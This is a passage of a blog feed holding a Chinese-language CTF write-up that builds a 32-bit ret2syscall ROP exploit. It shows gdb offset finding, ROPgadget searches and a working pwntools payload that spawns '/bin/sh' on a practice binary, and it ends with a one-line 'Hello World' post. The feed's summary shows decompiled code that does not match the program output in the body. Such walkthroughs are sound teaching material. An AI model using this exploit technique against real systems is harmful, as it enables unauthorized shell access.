class="variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x0 </span><br><span class="line">EBX: 0x80481a8 (&lt;_init&gt;:push   ebx)</span><br><span class="line">ECX: 0xfbad2288 </span><br><span class="line">EDX: 0x80eb4e0 --&gt; 0x0 </span><br><span class="line">ESI: 0x0 </span><br><span class="line">EDI: 0x80ea00c --&gt; 0x8067b10 (&lt;__stpcpy_sse2&gt;:mov    edx,DWORD PTR [esp+0x4])</span><br><span class="line">EBP: 0x6941414d (<span class="string">&#x27;MAAi&#x27;</span>)</span><br><span class="line">ESP: 0xffffd020 (<span class="string">&quot;ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">EIP: 0x41384141 (<span class="string">&#x27;AA8A&#x27;</span>)</span><br><span class="line">EFLAGS: 0x10282 (carry parity adjust zero SIGN <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">Invalid <span class="variable">$PC</span> address: 0x41384141</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd020 (<span class="string">&quot;ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">0004| 0xffffd024 (<span class="string">&quot;jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">0008| 0xffffd028 (<span class="string">&quot;AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">0012| 0xffffd02c (<span class="string">&quot;AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">0016| 0xffffd030 (<span class="string">&quot;PAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">0020| 0xffffd034 (<span class="string">&quot;AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">0024| 0xffffd038 (<span class="string">&quot;AmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">0028| 0xffffd03c (<span class="string">&quot;RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x41384141 <span class="keyword">in</span> ?? ()</span><br><span class="line">gdb-peda$ pattern offset AA8A</span><br><span class="line">AA8A found at offset: 112</span><br></pre></td></tr></table></figure><p>手动计算也是可以的（当然手动计算只是为了了解原理，用工具算更方便）<br>在IDA中找到call gets的位置，设置断点并运行</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>08048E8F                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">esp</span>+<span class="number">1Ch</span>]</span><br><span class="line"><span class="symbol">.text:</span>08048E93                 <span class="keyword">mov</span>     [<span class="built_in">esp</span>], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>08048E96                 <span class="keyword">call</span>    gets</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ b *0x08048E96</span><br><span class="line">Breakpoint 1 at 0x8048e96: file rop.c, line 15.</span><br><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: rop </span><br><span class="line">This time, no system() and NO SHELLCODE!!!</span><br><span class="line">What <span class="keyword">do</span> you plan to <span class="keyword">do</span>?</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xffffcfac --&gt; 0x3 </span><br><span class="line">EBX: 0x80481a8 (&lt;_init&gt;:push   ebx)</span><br><span class="line">ECX: 0x80eb4d4 --&gt; 0x0 </span><br><span class="line">EDX: 0x18 </span><br><span class="line">ESI: 0x0 </span><br><span class="line">EDI: 0x80ea00c --&gt; 0x8067b10 (&lt;__stpcpy_sse2&gt;:mov    edx,DWORD PTR [esp+0x4])</span><br><span class="line">EBP: 0xffffd018 --&gt; 0x8049630 (&lt;__libc_csu_fini&gt;:push   ebx)</span><br><span class="line">ESP: 0xffffcf90 --&gt; 0xffffcfac --&gt; 0x3 </span><br><span class="line">EIP: 0x8048e96 (&lt;main+114&gt;:call   0x804f650 &lt;gets&gt;)</span><br><span class="line">EFLAGS: 0x282 (carry parity adjust zero SIGN <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br></pre></td></tr></table></figure><p>可以看到ESP为0xffffcf90，s为0xffffcfac，EBP为0xffffd018<br>0xffffd018-0xffffcfac+4得到偏移量112<br>我们要执行的内容是</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">execve(<span class="string">&quot;/bin/sh&quot;</span>,NULL,NULL)</span><br><span class="line">相当于</span><br><span class="line">int 0x80(eax,ebx,ecx,edx)</span><br></pre></td></tr></table></figure><p>该程序是32位，所以我们需要使得<br>系统调用号，即 eax 应该为 0xb<br>第一个参数，即 ebx 应该指向 /bin/sh 的地址。<br>第二个参数，即 ecx 应该为 0<br>第三个参数，即 edx 应该为 0<br>那么要如何控制这些寄存器的值呢？如果栈顶是1，pop eax之后eax的值就会变为1。这里就需要使用对应操作的gadgets了。<br>先找出pop eax然后ret的gadgets</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only <span class="string">&#x27;pop|ret&#x27;</span> | grep <span class="string">&#x27;eax&#x27;</span> </span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0807217a : pop eax ; ret 0x80e</span><br><span class="line">0x0804f704 : pop eax ; ret 3</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure><p>这里使用最简单的第二个来作为gadgets<br>同理，我们还需要找出控制另外三个寄存器的gadgets</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only <span class="string">&#x27;pop|ret&#x27;</span> | grep <span class="string">&#x27;ebx&#x27;</span></span><br><span class="line">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x080be23f : pop ebx ; pop edi ; ret</span><br><span class="line">0x0806eb69 : pop ebx ; pop edx ; ret</span><br><span class="line">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class="line">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099c87 : pop ebx ; ret 8</span><br><span class="line">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class="line">0x0806336b : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class="line">0x0805c820 : pop esi ; pop ebx ; ret</span><br><span class="line">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0807b6ed : pop ss ; pop ebx ; ret</span><br></pre></td></tr></table></figure><p>发现这里的0x0806eb90可以直接控制edx，ecx，ebx三个寄存器，比较方便，于是直接选用这个作为gadgets<br>然后还需要找出”/bin/sh”和int 0x80 的地址</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop --string <span class="string">&quot;/bin/sh&quot;</span>  </span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080be408 : /bin/sh</span><br><span class="line"></span><br><span class="line">ROPgadget --binary rop --only <span class="string">&#x27;int&#x27;</span>      </span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 1</span><br></pre></td></tr></table></figure><p>然后就可以写出对应的payload了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">bin_sh = <span class="number">0x80be408</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">112</span>+p32(pop_eax_ret)+p32(<span class="number">0xb</span>)+p32(pop_edx_ecx_ebx_ret)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(bin_sh)+p32(int_0x80)</span><br><span class="line">print(payload)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>成功getshell</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./rop&#x27;</span>: pid 1768271</span><br><span class="line">b<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\xb1\x0b\x08\x0b\x00\x00\x00\x90\xeb\x06\x08\x00\x00\x00\x00\x00\x00\x00\x00\x08\xe4\x0b\x08!\x94\x04\x08&#x27;</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">This time, no system() and NO SHELLCODE!!!</span><br><span class="line">What <span class="keyword">do</span> you plan to <span class="keyword">do</span>?</span><br><span class="line">$ whoami</span><br><span class="line">qwq</span><br><span class="line">$  </span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;使用checksec检查保护&lt;/p&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;checksec rop &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[*] &lt;span class=&quot;string&quot;&gt;&amp;#x27;rop&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    Arch:     i386-32-little&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    RELRO:    Partial RELRO&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    Stack:    No canary found&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    NX:       NX enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    PIE:      No PIE (0x8048000)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;丢进IDA查看源码&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; __cdecl &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; argc, &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; **argv, &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; **envp)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; s[&lt;span class=&quot;number&quot;&gt;100&lt;/span&gt;]; &lt;span class=&quot;comment&quot;&gt;// [esp+1Ch] [ebp-64h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  setvbuf(&lt;span class=&quot;built_in&quot;&gt;stdout&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  setvbuf(&lt;span class=&quot;built_in&quot;&gt;stdin&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;built_in&quot;&gt;puts&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;No system for you this time !!!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  gets(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;built_in&quot;&gt;strncpy&lt;/span&gt;(buf2, s, &lt;span class=&quot;number&quot;&gt;0x64&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;bye bye ~&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2020/12/27/hello-world/"/>
    <id>http://example.com/2020/12/27/hello-world/</id>
    <published>2020-12-27T12:41:54.935Z</published>
    <updated>2020-12-28T16:24:35.062Z</updated>
    
    <content type="html"><![CDATA[<p>Nya~</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Nya~&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
</feed>
